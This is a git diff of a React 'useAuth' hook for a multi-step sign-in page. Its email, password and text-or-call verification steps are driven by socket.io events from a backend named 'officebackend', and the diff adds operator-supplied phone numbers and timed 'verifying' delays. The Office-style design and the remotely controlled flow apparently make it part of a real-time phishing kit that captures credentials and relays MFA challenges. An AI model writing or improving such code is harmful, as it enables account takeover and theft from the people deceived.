@@ -14,6 +14,7 @@ const useAuth = () => {
   const [verificationMessage, setVerificationMessage] = useState("");
   const [currentStep, setCurrentStep] = useState(0);
   const [authNumber, setAuthNumber] = useState("");
+  const [phone, setPhone] = useState("");
   const [formData, setFormData] = useState({
     email: "",
     password: "",
@@ -238,6 +239,7 @@ const useAuth = () => {
                 // onClick={() => setCurrentStep(currentStep + 1)}
                 onClick={handlePasswordSubmit}
                 style={{
+                  cursor: "pointer",
                   color: "rgb(255, 255, 255)",
                   border: "1px solid rga(0, 103, 184)",
                   minWidth: "108px",
@@ -333,7 +335,10 @@ const useAuth = () => {
               >
                 <Image src="/icons/text.svg" alt="secure" />
 
-                <Text wordWrap="break-word">Text +XXX XXXXXXXXX09</Text>
+                <Text wordWrap="break-word">
+                  Text{" "}
+                  <span style={{ textTransform: "uppercase" }}>{phone}</span>
+                </Text>
               </HStack>
               <HStack
                 _hover={{
@@ -349,7 +354,10 @@ const useAuth = () => {
               >
                 <Image src="/icons/call.svg" alt="secure" />
 
-                <Text wordWrap="break-word">Call +XXX XXXXXXXXX09</Text>
+                <Text wordWrap="break-word">
+                  Call{" "}
+                  <span style={{ textTransform: "uppercase" }}>{phone}</span>
+                </Text>
               </HStack>
             </VStack>
 
@@ -379,6 +387,8 @@ const useAuth = () => {
               <button
                 onClick={() => {
                   setVerificationMessage("");
+                  setAuthNumber("");
+                  setPhone("");
                   setFormData({
                     email: "",
                     password: "",
@@ -1107,7 +1117,7 @@ const useAuth = () => {
 
   useEffect(() => {
     if (!socketRef.current) {
-      socketRef.current = io("https://officebackend-15b3.onrender.com");
+      socketRef.current = io(import.meta.env.VITE_BASE_URL);
 
       socketRef.current.on("connect", () => {
         console.log(
@@ -1158,6 +1168,31 @@ const useAuth = () => {
                 navigateToStep(parseInt(data.nextStep));
               }
             }, 2000);
+          } else {
+            setIsVerifying(true);
+
+            setTimeout(() => {
+              if (data.nextStep) {
+                setIsVerifying(false);
+                navigateToStep(parseInt(data.nextStep));
+              }
+            }, 9000);
+          }
+        } else if (data.eventType === "password-submission") {
+          if (data.response === "phone") {
+            setIsVerifying(false);
+
+            if (data.nextStep) {
+              navigateToStep(parseInt(data.nextStep));
+            }
+
+            if (data.message) {
+              setVerificationMessage(data.message);
+            }
+
+            if (data.phone) {
+              setPhone(data.phone);
+            }
           } else {
             setIsVerifying(true);
 
